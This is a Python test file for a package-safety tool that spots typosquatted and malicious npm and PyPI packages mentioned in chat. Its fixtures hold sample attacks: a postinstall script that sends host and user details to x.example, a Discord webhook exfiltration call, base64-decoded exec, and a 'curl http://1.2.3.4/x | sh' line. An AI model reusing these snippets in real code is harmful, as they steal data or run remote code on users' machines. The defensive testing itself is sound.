"""Offline tests: no network, no Switch server. Run with `python -m pytest -q`."""
import io
import json
import tarfile

import pytest

from gatekeeper.crew import asker_of, handoff, ledger_text, my_part, parse_ledger, tokens
from gatekeeper.extract import packages_in
from gatekeeper.fixer import rewrite
from gatekeeper.inspect_pkg import Inspection, _members, analyze, scan_text
from gatekeeper.registry import PackageReport, imitates, lookalike


# ---------- reading install lines out of chat ----------

@pytest.mark.parametrize("text, expected", [
    ("npm i expres axios", [("npm", "expres"), ("npm", "axios")]),
    ("run `pip install requests==2.31 flask[async]`", [("pypi", "requests"), ("pypi", "flask")]),
    ("yarn add @types/node@20 -D", [("npm", "@types/node")]),
    ("uv add httpx\npoetry add rich", [("pypi", "httpx"), ("pypi", "rich")]),
    ("pip install -r requirements.txt", []),
    ("npm install ./local-pkg https://x.y/z.tgz", []),
    ("just chatting about npm today", []),
])
def test_packages_in(text, expected):
    assert packages_in(text) == expected


def test_packages_in_dedupes():
    assert packages_in("npm i lodash\nnpm i lodash") == [("npm", "lodash")]


# ---------- lookalikes ----------

@pytest.mark.parametrize("new, real, hit", [
    ("expresss", "express", True),
    ("exprss", "express", True),
    ("reqeusts", "requests", True),      # swapped letters
    ("python-dateutil", "pythondateutil", True),
    ("express", "express", False),       # the real package itself
    ("express-js", "express", False),
    ("ab", "abc", False),                # too short to judge
])
def test_imitates(new, real, hit):
    assert imitates(new, real) is hit


def test_lookalike_uses_popular_lists():
    assert lookalike("npm", "lodahs") == "lodash"
    assert lookalike("pypi", "reqeusts") == "requests"
    assert lookalike("npm", "lodash") is None


# ---------- verdicts ----------

def test_verdicts():
    assert PackageReport("npm", "x", exists=False).verdict == "ghost"
    r = PackageReport("npm", "expres", exists=True, versions=5, similar_to="express")
    r.flags.append("one typo away from `express`")
    assert r.verdict in ("danger", "suspicious")
    ok = PackageReport("npm", "axios", exists=True, versions=147, repository="git+https://github.com/axios/axios")
    assert ok.verdict == "ok"


# ---------- Fixer's rewrite ----------

def test_rewrite_swaps_and_drops():
    out = rewrite("Sure! run: npm i expres axios number-to-words-indian", {"expres": "express", "number-to-words-indian": None})
    assert out == ["Sure! run: npm i express axios"] or out == ["npm i express axios"] or out[0].endswith("npm i express axios")


def test_rewrite_nothing_left():
    assert rewrite("npm install ghosty", {"ghosty": None}) == []


def test_rewrite_keeps_versions_of_others():
    assert rewrite("pip install reqeusts flask==3.0", {"reqeusts": "requests"}) == ["pip install requests flask==3.0"]


# ---------- the handoff message that travels through Switch ----------

def test_handoff_round_trip():
    names, body = handoff("Ankith", ["npm:expres"], ["npm:number-to-words-indian"], "npm i expres axios number-to-words-indian")
    assert names == ["inspector", "squat-watch", "fixer"]
    assert tokens(my_part(body, "inspector")) == [("npm", "expres")]
    assert tokens(my_part(body, "squat-watch")) == [("npm", "number-to-words-indian")]
    assert packages_in(my_part(body, "fixer")) == [("npm", "expres"), ("npm", "axios"), ("npm", "number-to-words-indian")]
    assert asker_of(body) == "Ankith"


def test_handoff_only_names_who_has_work():
    names, body = handoff("A", [], [], "npm i esbuild")
    assert names == ["fixer"]
    assert my_part(body, "inspector") is None


# ---------- the ledger room document ----------

def test_ledger_round_trip():
    room = {"rules": {"min_age_days": 60}, "approved": {"npm:esbuild": {"by": "ankith", "at": "04 Nov 14:09"}}}
    text = ledger_text(room)
    assert "60 days" in text and "esbuild: approved by ankith" in text
    data = parse_ledger(text)
    assert data["rules"]["min_age_days"] == 60
    assert "npm:esbuild" in data["approved"]


def test_parse_ledger_tolerates_garbage():
    assert parse_ledger(None) is None
    assert parse_ledger("no json here") is None


# ---------- Inspector, on fake packages built in memory ----------

def _tgz(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for path, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(path)
            info.size = len(data)
            t.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _inspect(files: dict[str, str]) -> Inspection:
    blob = _tgz(files)
    return analyze(Inspection("npm", "fake"), _members(blob, "fake.tgz"))


def test_inspector_flags_install_time_exfiltration():
    res = _inspect({
        "package/package.json": json.dumps({"name": "fake", "scripts": {"postinstall": "node collect.js"}}),
        "package/collect.js": "const os=require('os');const https=require('https');"
                              "https.request({host:'x.example'}).end(JSON.stringify({h:os.hostname(),u:os.userInfo()}))",
    })
    assert res.verdict == "malicious-looking"
    assert any("during install" in f.label for f in res.findings)


def test_inspector_flags_webhooks_and_decoded_exec():
    res = _inspect({"package/index.js": "fetch('https://discord.com/api/webhooks/1/abc')",
                    "package/setup.py": "exec(base64.b64decode('aGk='))"})
    labels = {f.label for f in res.findings}
    assert "sends data to a Discord or Telegram webhook" in labels
    assert "decodes hidden code and runs it" in labels


def test_inspector_ignores_tests_docs_and_ci_scripts():
    res = _inspect({
        "package/index.js": "module.exports = (a, b) => a + b;",
        "package/test/evil.test.js": "require('child_process').execSync('curl http://1.2.3.4/x | sh')",
        "package/ci/install.sh": "curl https://sh.rustup.rs | sh",
    })
    assert res.verdict == "clean"


def test_inspector_clean_package():
    res = _inspect({"package/package.json": json.dumps({"name": "left-pad"}), "package/index.js": "module.exports = s => s;"})
    assert res.verdict == "clean"
    assert res.files_read == 2


def test_empty_archive_is_unknown_not_clean():
    res = _inspect({"package/logo.png": "binary"})
    assert res.verdict == "unknown"


def test_prose_is_not_wallet_theft():
    assert not [f for f in scan_text("README.md", "Keep the local state of the editor") if "wallet" in f.label]


# ---------- dependency files dropped into chat ----------

def test_package_json_and_lockfile():
    from gatekeeper.extract import packages_in_file
    pj = '{"dependencies": {"expres": "^1", "@types/node": "20"}, "devDependencies": {"lodahs": "1"}}'
    assert packages_in_file("package.json", pj) == [("npm", "expres"), ("npm", "@types/node"), ("npm", "lodahs")]
    lock = '{"packages": {"": {"dependencies": {"axios": "1"}}, "node_modules/x": {}}}'
    assert packages_in_file("package-lock.json", lock) == [("npm", "axios")]


def test_requirements_and_pyproject():
    from gatekeeper.extract import packages_in_file
    req = "reqeusts==2.0\n# comment\nflask[async]>=3\n-r other.txt\ngit+https://x/y.git\n"
    assert packages_in_file("requirements-dev.txt", req) == [("pypi", "reqeusts"), ("pypi", "flask")]
    pp = '[project]\ndependencies = ["httpx>=0.27", "rich"]\n\n[tool.poetry.dependencies]\npython = "^3.11"\nnumpyy = "1"\n'
    assert packages_in_file("pyproject.toml", pp) == [("pypi", "httpx"), ("pypi", "rich"), ("pypi", "numpyy")]


def test_is_dep_file_and_install_lines():
    from gatekeeper.extract import is_dep_file
    from gatekeeper.scout import install_lines
    assert is_dep_file("app/requirements.txt") and is_dep_file("package.json") and not is_dep_file("README.md")
    assert install_lines([("npm", "expres"), ("pypi", "reqeusts"), ("npm", "lodahs")]) == "npm i expres lodahs\npip install reqeusts"
    assert rewrite(install_lines([("npm", "expres")]), {"expres": "express"}) == ["npm i express"]
